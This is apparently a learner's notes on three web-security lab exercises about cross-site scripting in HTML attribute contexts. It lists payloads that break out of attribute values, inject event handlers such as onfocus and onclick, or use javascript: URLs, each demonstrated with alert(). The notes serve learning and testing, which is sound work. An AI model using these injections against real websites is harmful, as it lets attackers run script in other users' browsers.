When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
`"><script>alert(document.domain)</script>`

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:
`" autofocus onfocus=alert(document.domain) x="`
The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup.

---

## Exploits
1. `a" autofocus onfocus="alert(1)`
2. `javascript:alert(1)`
3. `'accesskey='X'onclick='alert(1)`


```js
<input value="ControlledValue">
<a href="ControlledValue">
<link rel="canonical" href='controlladValue'/>
```


---
### lab1
```js
<input type=text placeholder='Search the blog...' name='search' value="ControlledValue">

____Exploit____
a" autofocus onfocus="alert(1)
```

### lab2
```js
<a href="ControlledValue">

___Exploit____

javascript:alert(1)
```

### lab3
#### hidden input: canonical link
canonical link is a link that is created dynmaicly to observe the ideal http request that the request should look like.
You can't find it directly, you should submit additional arguements to the page in order to see it.
```js
<link rel="canonical" href='controlladValue'/>


       ____Exploit_____
'       'accesskey='X'onclick='alert(1) 
```

> [!important] Important
> You don't need to add spaces between attributes to seperate them, put you should put the values inside **' '** or **" "**

```js
<link rel="canonical" href='http://academy.net/?'accesskey='X'onclick='alert(1)'/>
```

